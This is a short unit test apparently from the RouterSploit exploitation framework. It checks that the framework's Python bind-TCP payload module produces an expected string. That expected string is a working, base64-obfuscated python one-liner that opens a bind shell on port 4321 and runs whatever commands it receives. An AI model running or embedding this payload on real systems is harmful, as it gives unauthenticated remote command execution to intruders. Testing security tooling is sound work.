from routersploit.modules.payloads.cmd.python_bind_tcp import Payload


# python bind tcp payload with rport=4321
bind_tcp = (
    "python -c \"exec('aW1wb3J0IHNvY2tldCxvcwpzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uYmluZCgoJzAuMC4wLjAnLDQzMjEpKQpzby5saXN0ZW4oMSkKc28sYWRkcj1zby5hY2NlcHQoKQp4PUZhbHNlCndoaWxlIG5vdCB4OgoJZGF0YT1zby5yZWN2KDEwMjQpCglzdGRpbixzdGRvdXQsc3RkZXJyLD1vcy5wb3BlbjMoZGF0YSkKCXN0ZG91dF92YWx1ZT1zdGRvdXQucmVhZCgpK3N0ZGVyci5yZWFkKCkKCXNvLnNlbmQoc3Rkb3V0X3ZhbHVlKQo='.decode('base64'))\""
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.rport = 4321

    assert payload.run() == bind_tcp
